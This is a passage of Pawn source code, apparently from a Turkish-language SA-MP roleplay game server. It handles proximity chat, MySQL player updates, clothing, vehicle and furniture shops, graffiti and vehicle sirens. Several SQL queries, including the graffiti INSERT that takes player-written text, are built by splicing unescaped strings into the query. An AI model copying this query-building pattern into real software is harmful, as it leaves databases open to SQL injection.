		//radi = 2.0; //Trigger Radius
		new _string[512],__string[512],ilkbosluk=0;
		format(__string, sizeof(__string), "%s", string);
		format(_string, sizeof(_string), "%s", string);
		for(new i;i<strlen(string);i++)
		{
		    if(__string[i] == ' ')
			{
			    ilkbosluk++;
			    if(ilkbosluk == 2)
			    {
				    if(GetPVarInt(playerid, "SectigiDil") == 1) strins(__string, " (Almanca):", i);
				    else if(GetPVarInt(playerid, "SectigiDil") == 2) strins(__string, " (Arapça):", i);
				    else if(GetPVarInt(playerid, "SectigiDil") == 3) strins(__string, " (Çince):", i);
				    else if(GetPVarInt(playerid, "SectigiDil") == 4) strins(__string, " (Fransýzca):", i);
				    else if(GetPVarInt(playerid, "SectigiDil") == 5) strins(__string, " (Ýspanyolca):", i);
				    else if(GetPVarInt(playerid, "SectigiDil") == 6) strins(__string, " (Ýtalyanca):", i);
				    else if(GetPVarInt(playerid, "SectigiDil") == 7) strins(__string, " (Japonca):", i);
				    else if(GetPVarInt(playerid, "SectigiDil") == 8) strins(__string, " (Rusça):", i);
				    else if(GetPVarInt(playerid, "SectigiDil") == 9) strins(__string, " (Ýbranice):", i);
				    else if(GetPVarInt(playerid, "SectigiDil") == 10) strins(__string, " (Yunanca):", i);
				    else if(GetPVarInt(playerid, "SectigiDil") == 11) strins(__string, " (Ermenice):", i);
				    else if(GetPVarInt(playerid, "SectigiDil") == 12) strins(__string, " (Slovakça):", i);
				    else if(GetPVarInt(playerid, "SectigiDil") == 13) strins(__string, " (Ýrlandaca):", i);
				    else if(GetPVarInt(playerid, "SectigiDil") == 14) strins(__string, " (Portekizce):", i);
				    else if(GetPVarInt(playerid, "SectigiDil") == 15) strins(__string, " (Sýrpça):", i);
				    else if(GetPVarInt(playerid, "SectigiDil") == 16) strins(__string, " (Arnavutça):", i);
				    strdel(_string, i, strlen(_string));
				    format(_string, sizeof(_string), "%s (%s): ???",_string, DilNameEx(tip));
				    break;
				}
			}
		}
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i) && GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(i))
			{
				if(!BigEar[i])
				{
					GetPlayerPos(i, sposx, sposy, sposz);
					tempposx = (oldposx -sposx);
					tempposy = (oldposy -sposy);
					tempposz = (oldposz -sposz);
					if (((tempposx < radi/16) && (tempposx > -radi/16)) && ((tempposy < radi/16) && (tempposy > -radi/16)) && ((tempposz < radi/16) && (tempposz > -radi/16)))
					{
					    if(!DilKontrol(playerid, i))
						{
							SendClientMessage(i, col1, _string);
						}
						else
						{
							SendClientMessage(i, col1, __string);
						}
					}
					else if (((tempposx < radi/8) && (tempposx > -radi/8)) && ((tempposy < radi/8) && (tempposy > -radi/8)) && ((tempposz < radi/8) && (tempposz > -radi/8)))
					{
						if(!DilKontrol(playerid, i))
						{
							SendClientMessage(i, col2, _string);
						}
						else
						{
							SendClientMessage(i, col2, __string);
						}
					}
					else if (((tempposx < radi/4) && (tempposx > -radi/4)) && ((tempposy < radi/4) && (tempposy > -radi/4)) && ((tempposz < radi/4) && (tempposz > -radi/4)))
					{
						if(!DilKontrol(playerid, i))
						{
							SendClientMessage(i, col3, _string);
						}
						else
						{
							SendClientMessage(i, col3, __string);
						}
					}
					else if (((tempposx < radi/2) && (tempposx > -radi/2)) && ((tempposy < radi/2) && (tempposy > -radi/2)) && ((tempposz < radi/2) && (tempposz > -radi/2)))
					{
						if(!DilKontrol(playerid, i))
						{
							SendClientMessage(i, col4, _string);
						}
						else
						{
							SendClientMessage(i, col4, __string);
						}
					}
					else if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
					{
						if(!DilKontrol(playerid, i))
						{
							SendClientMessage(i, col5, _string);
						}
						else
						{
							SendClientMessage(i, col5, __string);
						}
					}
				}
				else
				{
					SendClientMessage(i, col1, string);
				}
			}
		}
	}
	return 1;
}
forward ProxDetector(Float:radi, playerid, string[],col1,col2,col3,col4,col5);
public ProxDetector(Float:radi, playerid, string[],col1,col2,col3,col4,col5)
{
	if(IsPlayerConnected(playerid))
	{

		new Float:sposx, Float:sposy, Float:sposz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		//radi = 2.0; //Trigger Radius
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i) && GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(i))
			{
				if(!BigEar[i])
				{
					GetPlayerPos(i, sposx, sposy, sposz);
					tempposx = (oldposx -sposx);
					tempposy = (oldposy -sposy);
					tempposz = (oldposz -sposz);
					//print("DEBUG: X:%f Y:%f Z:%f",posx,posy,posz);
					if (((tempposx < radi/16) && (tempposx > -radi/16)) && ((tempposy < radi/16) && (tempposy > -radi/16)) && ((tempposz < radi/16) && (tempposz > -radi/16)))
					{
						SendClientMessage(i, col1, string);
					}
					else if (((tempposx < radi/8) && (tempposx > -radi/8)) && ((tempposy < radi/8) && (tempposy > -radi/8)) && ((tempposz < radi/8) && (tempposz > -radi/8)))
					{
						SendClientMessage(i, col2, string);
					}
					else if (((tempposx < radi/4) && (tempposx > -radi/4)) && ((tempposy < radi/4) && (tempposy > -radi/4)) && ((tempposz < radi/4) && (tempposz > -radi/4)))
					{
						SendClientMessage(i, col3, string);
					}
					else if (((tempposx < radi/2) && (tempposx > -radi/2)) && ((tempposy < radi/2) && (tempposy > -radi/2)) && ((tempposz < radi/2) && (tempposz > -radi/2)))
					{
						SendClientMessage(i, col4, string);
					}
					else if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
					{
						SendClientMessage(i, col5, string);
					}
				}
				else
				{
					SendClientMessage(i, col1, string);
				}
			}
		}
	}
	return 1;
}

forward StopTalk(playerid);
public StopTalk(playerid)
{
	if(!IsPlayerInAnyVehicle(playerid))
	{
		ApplyAnimationEx(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0);
		AnimasyonYapiyor[playerid] = false;
		return 1;
	}
	return 1;
}

forward MySQLUpdatePlayerIntSingle(sqlplayerid, sqlvalname[], sqlupdateint);
public MySQLUpdatePlayerIntSingle(sqlplayerid, sqlvalname[], sqlupdateint)
{
	new query[128];
	format(query, sizeof(query), "UPDATE `karakterler` SET `%s`='%d' WHERE `id`='%d'", sqlvalname, sqlupdateint, sqlplayerid);
	mysql_tquery(1,query);
	return 1;
}
forward MySQLUpdatePlayerStrSingle(sqlplayerid, sqlvalname[], sqlupdate[]);
public MySQLUpdatePlayerStrSingle(sqlplayerid, sqlvalname[], sqlupdate[]) // by Luk0r
{
	new query[128];
	format(query, sizeof(query), "UPDATE `karakterler` SET `%s` = '%s' WHERE `id` = '%d'", sqlvalname, sqlupdate, sqlplayerid);
	mysql_tquery(1,query);
	return 1;
}
forward BenzinistasyonuSil(istasyonid);
public BenzinistasyonuSil(istasyonid)
{
	Benzinistasyonu[istasyonid][bPosX] = 0.0000;
	Benzinistasyonu[istasyonid][bPosY] = 0.0000;
	Benzinistasyonu[istasyonid][bPosZ] = 0.0000;
	Benzinistasyonu[istasyonid][bDurum] = 0;
	return 1;
}

forward Benzinistasyonunda(playerid);
public Benzinistasyonunda(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    for(new i = 0; i < sizeof(Benzinistasyonu); i++)
	    {
	        if(Benzinistasyonu[i][bDurum] == 0)
	        {
		        if(PlayerToPoint(10.0, playerid, Benzinistasyonu[i][bPosX], Benzinistasyonu[i][bPosY], Benzinistasyonu[i][bPosZ]))
		        {
		            return 1;
				}
			}
		}
	}
	return 0;
}
forward Doldurpasamvol2(playerid, vid, Float:miktar, tutar);
public Doldurpasamvol2(playerid, vid, Float:miktar, tutar)
{
	GivePlayerCash(playerid,-tutar);
	Doldurpasam[playerid] = 0;
	//printf("Önceki Benzin:%f",Arac[vid][abenzin]);
	Arac[vid][abenzin] = Arac[vid][abenzin]+miktar;
	//printf("Sonraki Benzin:", Arac[vid][abenzin]);
	Bilgi(playerid, "Aracýnýzýn benzin deposunu doldurdunuz.");
	COZ(playerid);
	//printf("Public:");
	//printf("Playerid:%i Miktar:%f Tutar:%d Benzin:%f",playerid,miktar,tutar,Arac[GetPlayerVehicleID(playerid)][abenzin]);
}
public OnPlayerModelSelection(playerid, response, listid, modelid)
{
	if(Debug) printf("OnPlayerModelSelection(%d, %d, %d, %d)",playerid, response, listid, modelid);
	if(response)
	{
		if(listid == aksesuarliste || listid == pdaksesuarliste || listid == mcaksesuarliste)
		{

			new aksesuarucret;
			new aksesuarisim[128];
			for(new i = 0; i < sizeof(AttachmentObjects) ; i++)
			{
				if(modelid == AttachmentObjects[i][attachmodel])
				{
					aksesuarucret = AttachmentObjects[i][attachfiyat];
					format(aksesuarisim,sizeof(aksesuarisim),"%s",AttachmentObjects[i][attachname]);
				}
			}
			new test[128];
			format(test, sizeof(test),"Ýsim: %s\nModel: %d | Fiyat: %d$\nAksesuarý satýn almak istiyor musunuz?",aksesuarisim,modelid,aksesuarucret);
			ShowPlayerDialog(playerid,145,DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Aksesuar Sistemi",test,"Evet", "Hayýr");
			SectigiAksesuar[playerid] = modelid;
			AksesuarUcreti[playerid] = aksesuarucret;

		}
		else if(listid == aliste)
		{
		    if(response)
		    {
				new aafiyat;
				new aracadi[64];
				for(new i = 0; i < sizeof(GaleriListesi) ; i++)
				{
				    if(modelid == GaleriListesi[i][0])
				    {
						aafiyat = GaleriListesi[i][1];
						format(aracadi, sizeof(aracadi), "%s",GaleriListesi[i][3]);
					}
				}
				SectigiArac[playerid] = modelid;
				new ucret = floatround(aafiyat*PazarlikKatSayi(playerid));
				AldigiAracFiyati[playerid] = ucret;
				AracSatinalMenu(playerid);
			}
	    	return 1;
		}
		else if(listid == uliste)
		{
		    if(response)
		    {
				SectigiArac[playerid] = modelid;
				new ucret = floatround(AracFiyatBul(modelid)*PazarlikKatSayi(playerid));
				AldigiAracFiyati[playerid] = ucret;
				HavaAracSatinalMenu(playerid);
			}
	    	return 1;
		}
		else if(listid == bliste)
		{
		    if(response)
		    {
				SectigiArac[playerid] = modelid;
				new ucret = floatround(AracFiyatBul(modelid)*PazarlikKatSayi(playerid));
				AldigiAracFiyati[playerid] = ucret;
				DenizAracSatinalMenu(playerid);
			}
	    	return 1;
		}
		else if(listid == barikatliste)
		{
		    if(response)
	        {
	            new Float:pPos[3];
	            GetXYInFrontOfPlayer(playerid, pPos[0], pPos[1], pPos[2], 3.0);
	            BarikatEkle(playerid, modelid, pPos[0], pPos[1], pPos[2], 0.0, 0.0, 0.0);
	            Bilgi(playerid, "Space tuþuna basýlý tutarak ekraný çevirebilirsiniz.");
	        }
		}
		else if(listid == fdbarikatliste)
		{
		    if(response)
	        {
	            new Float:pPos[3];
	            GetXYInFrontOfPlayer(playerid, pPos[0], pPos[1], pPos[2], 3.0);
	            BarikatEkle(playerid, modelid, pPos[0], pPos[1], pPos[2], 0.0, 0.0, 0.0);
	            Bilgi(playerid, "Space tuþuna basýlý tutarak ekraný çevirebilirsiniz.");
	        }
		}
		else if(listid == erkekkiyafetbeyaz || listid == erkekkiyafetsiyah || listid == yenierkekkiyafetbeyaz || listid == yenierkekkiyafetsiyah)
		{
		    if(response)
		    {
		        if(GetPVarInt(playerid, "Dedektif") == 1)
		        {
			        SetPlayerSkin(playerid, modelid);
			        DeletePVar(playerid, "Dedektif");
			        //Karakter[playerid][skin] = modelid;
					KarakterKaydet(playerid);
				}
				else
				{
				    new ucret=-1;
					for(new i = 0; i < sizeof(ErkekKiyafetVerileri) ; i++)
					{
					    if(modelid == ErkekKiyafetVerileri[i][0])
					    {
							ucret = ErkekKiyafetVerileri[i][1];
						}
					}
					if(ucret == -1) ucret = 250;
				    new mstring[128];
				    format(mstring, sizeof(mstring), "{FFFFFF}%s(%d) Kýyafet fiyatý {B3B3B3}$%d {FFFFFF}olarak belirlenmiþtir.\nSatýn almak istiyor musunuz:", GetSkinModelNameEx(modelid), modelid, ucret);
				    ShowPlayerDialog(playerid, 230, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Kýyafet Sistemi", mstring,"Evet","Hayýr");
                    SectigiKiyafet[playerid] = modelid;
					KiyafetUcreti[playerid] = ucret;
				}
		    }
		}
		else if(listid == kadinkiyafetbeyaz || listid == kadinkiyafetsiyah || listid == yenikadinkiyafetbeyaz || listid == yenikadinkiyafetsiyah)
		{
		    if(response)
		    {
		        if(GetPVarInt(playerid, "Dedektif") == 1)
		        {
			        SetPlayerSkin(playerid, modelid);
			        DeletePVar(playerid, "Dedektif");
			        //Karakter[playerid][skin] = modelid;
					KarakterKaydet(playerid);
				}
				else
				{
				    new ucret=-1;
					for(new i = 0; i < sizeof(KadinKiyafetVerileri) ; i++)
					{
					    if(modelid == KadinKiyafetVerileri[i][0])
					    {
							ucret = KadinKiyafetVerileri[i][1];
						}
					}
					if(ucret == -1) ucret = 250;
				    new mstring[128];
				    format(mstring, sizeof(mstring), "{FFFFFF}%s(%d) Kýyafet fiyatý {B3B3B3}$%d {FFFFFF}olarak belirlenmiþtir.\nSatýn almak istiyor musunuz:", GetSkinModelNameEx(modelid), modelid, ucret);
				    ShowPlayerDialog(playerid, 230, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Kýyafet Sistemi", mstring,"Evet","Hayýr");
                    SectigiKiyafet[playerid] = modelid;
					KiyafetUcreti[playerid] = ucret;
				}
		    }
		}
		/*else if(listid == kgirisbeyaz || listid == kgirissiyah || listid == egirisbeyaz || listid == egirissiyah)
		{
		    if(response)
		    {
		        if(Karakter[playerid][skin] == -1)
		        {
			        SetPlayerSkin(playerid, modelid);
			        Karakter[playerid][skin] = modelid;
					KarakterKaydet(playerid);
				    if(!Karakter[playerid][yas])
					{
					    ShowPlayerDialog(playerid, 164, DIALOG_STYLE_INPUT, "Yaþ Seçimi", "[!]DÝKKAT Yaptýðýnýz seçimin geri dönüþü olmayacaktýr.\n\nLütfen yaþýnýzý girin. ", "Seçim", "");
					}
					else if(!DilKontrolEx(playerid))
					{
					    ShowPlayerDialog(playerid, 299, DIALOG_STYLE_LIST, "Ana Dil Seçimi(Tekrar Seçemezsiniz.)", "Almanca\nArapça\nÇince\nFransýzca\nÝspanyolca\nÝtalyanca\nJaponca\nRusça\nÝbranice\nYunanca\nErmenice\nSlovakça\nÝrlandaca\nPortekizce\nSýrpça\nArnavutça\nÝngilizce", "Seçim", "");
					}
					else if(!Karakter[playerid][boy])
					{
					    ShowPlayerDialog(playerid, 445, DIALOG_STYLE_LIST, "Boy Seçimi", "1.50-1.60m\n1.61-1.70m\n1.71-1.76m\n1.77-1.85m\n+1.85m", "Seçim", "");
					}
					else if(!Karakter[playerid][kilo])
					{
					    ShowPlayerDialog(playerid, 446, DIALOG_STYLE_LIST, "Kilo Seçimi", "40-50kg\n51-60kg\n61-65kg\n66-75kg\n76-85kg\n86-90kg\n91-100kg\n101-120kg\n+120kg", "Seçim", "");
					}
					else if(!Karakter[playerid][gozrenk])
					{
					    ShowPlayerDialog(playerid, 447, DIALOG_STYLE_LIST, "Göz Rengi Seçimi", "Siyah\nKahverengi\nMavi\nYeþil\nDiðer", "Seçim", "");
					}
					else if(!Karakter[playerid][sacrenk])
					{
					    ShowPlayerDialog(playerid, 448, DIALOG_STYLE_LIST, "Saç Rengi Seçimi", "Kel\nSiyah\nKahverengi\nKumral\nSarý\nKýzýl\nDiðer", "Seçim", "");
					}
				}
		    }
		}*/
		else if(listid == kgirisbeyaz || listid == kgirissiyah || listid == egirisbeyaz || listid == egirissiyah)
		{
		    if(response)
		    {
			        SetPlayerSkin(playerid, modelid);
			        SectigiKiyafet[playerid] = modelid;
			        ShowPlayerDialog(playerid, 666, DIALOG_STYLE_MSGBOX, "Kýyafet Seçimi", "Seçtiðiniz kýyafeti onaylýyor musunuz?", "Evet", "Hayýr");
		    }
		}
		else if(listid == pdkiyafeterkek || listid == pdkiyafetkadin)
		{
		    if(response)
		    {
		        SetPlayerSkin(playerid, modelid);
		        Karakter[playerid][isbasiskin] = modelid;
		        Karakter[playerid][isbasi] = 1;
				SetPlayerColor(playerid, 0x8D8DFFFF);
				SetPlayerArmour(playerid, 25);
		   		GivePlayerWeapon(playerid, 3, 1);
		        GivePlayerWeapon(playerid, 41, 1000);
		        GivePlayerWeapon(playerid, 24, 50);
	   			new string2[34];
				format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
				UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
				KarakterKaydet(playerid);
		    }
		}
		else if(listid == mdkiyafeterkek || listid == mdkiyafetkadin)
		{
		    if(response)
		    {
				SetPlayerSkin(playerid, modelid);
				Karakter[playerid][isbasiskin] = modelid;
				SetPlayerColor(playerid, COLOR_LSMC);
				Karakter[playerid][medisbasi] = 1;
	   			new targetrank[32];
				switch(Karakter[playerid][rutbe])
				{
					case 0: targetrank = "Sivil";
					case 1: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe1]);
					case 2: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe2]);
			 		case 3: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe3]);
			  		case 4: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe4]);
			   		case 5: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe5]);
			   		case 6: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe6]);
					case 7: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe7]);
					case 8: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe8]);
					case 9: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe9]);
					case 10: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe10]);
					case 11: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe11]);
					case 12: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe12]);
					case 13: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe13]);
					case 14: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe14]);
					case 15: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe15]);
					case 16: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe16]);
					case 17: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe17]);
					case 18: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe18]);
					case 19: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe19]);
					case 20: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe20]);
				}
				format(targetrank, 32, "[%s]", targetrank);
				if(Karakter[playerid][rutbe] <= 20) UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], COLOR_LSMC, targetrank);
		    }
		}
		else if(listid == fdkiyafeterkek || listid == fdkiyafetkadin)
		{
	    if(response)
	    {
			SetPlayerSkin(playerid, modelid);
			Karakter[playerid][isbasiskin] = modelid;
			SetPlayerColor(playerid, COLOR_LSFD);
			Karakter[playerid][fdisbasi] = 1;
      		new targetrank[32];
			switch(Karakter[playerid][rutbe])
			{
				case 0: targetrank = "Sivil";
				case 1: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe1]);
				case 2: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe2]);
		 		case 3: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe3]);
		  		case 4: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe4]);
		   		case 5: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe5]);
		   		case 6: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe6]);
				case 7: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe7]);
				case 8: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe8]);
				case 9: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe9]);
				case 10: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe10]);
				case 11: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe11]);
				case 12: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe12]);
				case 13: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe13]);
				case 14: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe14]);
				case 15: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe15]);
				case 16: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe16]);
				case 17: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe17]);
				case 18: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe18]);
				case 19: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe19]);
				case 20: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe20]);
			}
			format(targetrank, 32, "[%s]", targetrank);
			if(Karakter[playerid][rutbe] <= 20) UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], COLOR_LSFD, targetrank);
	    }
		}
		else if(listid == doors2 || listid == chairs || listid == lights2 || listid == kitchen || listid == walls || listid == beds || listid == tables || listid == bathroom || listid == fitness || listid == eletronic)
		{
			if(!Evlerim(playerid))
		    {
		        Hata(playerid, "Adýnýza kayýtlý hiç ev bulunamadý.");
		        return 1;
			}
			SetPVarInt(playerid, "MobilyaFiyat", 150);
			SetPVarInt(playerid, "MobilyaModel", modelid);
			new mstring[128],_ktext[16];
			if(listid == doors2)
				_ktext = "Kapý";
			else if(listid == chairs)
				_ktext = "Sandalye";
			else if(listid == lights2)
				_ktext = "Iþýk";
			else if(listid == kitchen)
				_ktext = "Mutfak";
			else if(listid == walls)
				_ktext = "Duvar";
			else if(listid == beds)
				_ktext = "Yatak";
			else if(listid == tables)
				_ktext = "Masa";
			else if(listid == bathroom)
				_ktext = "Banyo";
			else if(listid == fitness)
				_ktext = "Diger";
			else if(listid == eletronic)
				_ktext = "Elektronik";
			format(mstring, sizeof(mstring), ""C2""NOKTA"Mobilya\n"C2"Kategori:\t "C1"%s\n"C2"Modelid:\t "C1"%d\n"C2"Fiyat:\t\t "DOLAR"$"C1"%d",_ktext,modelid,GetPVarInt(playerid, "MobilyaFiyat"));
			ShowPlayerDialog(playerid, 303, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Mobilya", mstring, "Satýnal", "Ýptal");
		}
 		return 1;
	}
	return 1;
}
forward GraffitiKontrol(playerid);
public GraffitiKontrol(playerid)
{
    new keys, ud, lr;
    GetPlayerKeys(playerid, keys, ud, lr);

    if (!(keys & KEY_FIRE) && !(keys & KEY_FIRE) || !(keys & KEY_FIRE) && !(keys & KEY_HANDBRAKE))
    {
		return false;
    }
	if(IsPlayerInRangeOfPoint(playerid,4,Karakter[playerid][gPos][0],Karakter[playerid][gPos][1],Karakter[playerid][gPos][2]))
	{
		if(Karakter[playerid][gYapiyor] == 1)
	    {
			if(Karakter[playerid][gSure] > 0)
			{
			    Karakter[playerid][gSure]--;
			}
			else if(Karakter[playerid][gSure] <= 0)
			{
			    new i,SQLSorgusu[1024];
			    format(SQLSorgusu, sizeof(SQLSorgusu), "INSERT INTO `graffitiler` (`gYapan`,`gX`,`gY`,`gZ`,`gRX`, `gRY`, `gRZ`,`gYazi`,`gRenk`,`gVW`,`gInt`,`gFont`,`FontBoyut`,`MateryalBoyut`,`FontBold2`) VALUES('%d','%f','%f','%f', '%f', '%f', '%f','%s','%d','%d','%d','%s','%d','%d','%d')",
				Karakter[playerid][sqlid],Karakter[playerid][gPos][0],Karakter[playerid][gPos][1],Karakter[playerid][gPos][2],Karakter[playerid][gRot][0], Karakter[playerid][gRot][1], Karakter[playerid][gRot][2],Karakter[playerid][gYazi],Karakter[playerid][gRenk],
				Karakter[playerid][gVW],Karakter[playerid][gInt],Karakter[playerid][gFont],FontBoyutu[playerid],MateryalBoyutu[playerid],FontBold[playerid]);
			    new Cache:cache = mysql_query(SQLSorgusu);
			    i = cache_insert_id();
		    	cache_delete(cache);
			    Karakter[playerid][gSure] = 0;
			    Karakter[playerid][gYapiyor] = 0;
			    Graffitiler[i][gRenk]   = 	Karakter[playerid][gRenk];
				Graffitiler[i][gPos][0] = 	Karakter[playerid][gPos][0];
				Graffitiler[i][gPos][1] = 	Karakter[playerid][gPos][1];
				Graffitiler[i][gPos][2] = 	Karakter[playerid][gPos][2];
				Graffitiler[i][gRot][0] = 	Karakter[playerid][gRot][0];
				Graffitiler[i][gRot][1] = 	Karakter[playerid][gRot][1];
				Graffitiler[i][gRot][2] = 	Karakter[playerid][gRot][2];
				Graffitiler[i][gVW] 	= 	Karakter[playerid][gVW];
				Graffitiler[i][gInt] 	= 	Karakter[playerid][gInt];
				Graffitiler[i][MateryalBoyut] = MateryalBoyutu[playerid];
				Graffitiler[i][FontBoyut] = FontBoyutu[playerid];
				Graffitiler[i][FontBold2] = FontBold[playerid];
				strcpy(Graffitiler[i][gYazi],Karakter[playerid][gYazi],64);
				strcpy(Graffitiler[i][gFont],Karakter[playerid][gFont],64);
				Graffitiler[i][gYapan] = Karakter[playerid][sqlid];
				DestroyDynamic3DTextLabel(Karakter[playerid][gLabel]);
				Graffitiler[i][gObje] = CreateDynamicObject(19482,Karakter[playerid][gPos][0],Karakter[playerid][gPos][1],Karakter[playerid][gPos][2],Karakter[playerid][gRot][0],Karakter[playerid][gRot][1],Karakter[playerid][gRot][2],Karakter[playerid][gVW],Karakter[playerid][gInt]);
				ObjeKurdu(playerid);
				Streamer_Update(playerid);
				SetDynamicObjectMaterialText(Graffitiler[i][gObje], 0,Graffitiler[i][gYazi],Graffitiler[i][MateryalBoyut],Graffitiler[i][gFont],Graffitiler[i][FontBoyut],Graffitiler[i][FontBold2],Graffitiler[i][gRenk],0,0);
				Bilgi(playerid,"Graffitiyi bitirdiniz.");
				gObjesi[playerid] = 0;
				Karakter[playerid][gOnizleme] = 0;
				GraffitiKaydet(i);
				Karakter[playerid][gPos][0] = 0;
				Karakter[playerid][gPos][1] = 0;
				Karakter[playerid][gPos][2] = 0;
				strcpy(Karakter[playerid][gYazi],"Yok",12);
				strcpy(Karakter[playerid][gFont],"Yok",12);
			}
	    }
	}
	else
	{
	    Hata(playerid,"Graffitiden uzaklaþtýnýz.");
	}
	return SetTimerEx("GraffitiKontrol",1000, false, "d", playerid);
}
forward GraffitiSuresi(playerid);
public GraffitiSuresi(playerid)
{
    if(Karakter[playerid][gOnizleme] == 1)
    {
		DestroyDynamicObject(gObjesi[playerid]);
		Karakter[playerid][gOnizleme] = 0;
		Bilgi(playerid,"Graffiti önizlemesinden sonra 90 saniye geçti ve sistem tarafýndan iptal edildi.");
	}
}
forward Objebitti(playerid, objectid, response, Float:gelenx, Float:geleny, Float:gelenz, Float:gelenrx, Float:gelenry, Float:gelenrz);
public Objebitti(playerid, objectid, response, Float:gelenx, Float:geleny, Float:gelenz, Float:gelenrx, Float:gelenry, Float:gelenrz)
{
	if(Karakter[playerid][gDuzenliyor] == 1)
	{
	    Karakter[playerid][gPos][0] = gelenx;
	    Karakter[playerid][gPos][1] = geleny;
	    Karakter[playerid][gPos][2] = gelenz;
	    Karakter[playerid][gRot][0] = gelenrx;
	    Karakter[playerid][gRot][1] = gelenry;
	    Karakter[playerid][gRot][2] = gelenrz;
	    Karakter[playerid][gVW] = GetPlayerVirtualWorld(playerid);
	    Karakter[playerid][gInt] = GetPlayerInterior(playerid);
	   	SetDynamicObjectPos(gObjesi[playerid],Karakter[playerid][gPos][0],Karakter[playerid][gPos][1],Karakter[playerid][gPos][2]);
		SetDynamicObjectRot(gObjesi[playerid],Karakter[playerid][gRot][0],Karakter[playerid][gRot][1],Karakter[playerid][gRot][2]);
		Karakter[playerid][gDuzenliyor] = 0;
	}
	return 1;
}
//_____________________________________STOCKS___________________________________
stock AracaSiren(am)
{
	new Float: x, Float: y, Float: z, Float: rx, Float: ry, Float: rz;
	switch(Arac[am][amodel])
	{
	    case 560:
	    {
			x = -0.549498; y = 0.111000; z = 0.884513;
			rx = 0.000000; ry = 0.000000; rz = 0.000000;
			Arac[am][SirenObje] = CreateDynamicObject(18646, 0, 0, 0, 0, 0, 0);
	    }
	    case 541:
	    {
			x = -0.389999; y = 0.025000; z = 0.669999;
			rx = 0.000000; ry = 0.000000; rz = 0.000000;
			Arac[am][SirenObje] = CreateDynamicObject(18646, 0, 0, 0, 0, 0, 0);
	    }
	    case 599:
	    {
			x = -0.639999; y = 1.269999; z = 0.562499;
			rx = 0.000000; ry = 0.000000; rz = 0.000000;
			Arac[am][SirenObje] = CreateDynamicObject(18646, 0, 0, 0, 0, 0, 0);
	    }
	    case 596:
	    {
			x = -0.724999; y = 1.220499; z = 0.354999;
			rx = 0.000000; ry = 0.000000; rz = 0.000000;
			Arac[am][SirenObje] = CreateDynamicObject(18646, 0, 0, 0, 0, 0, 0);
	    }
		case 597:
		{
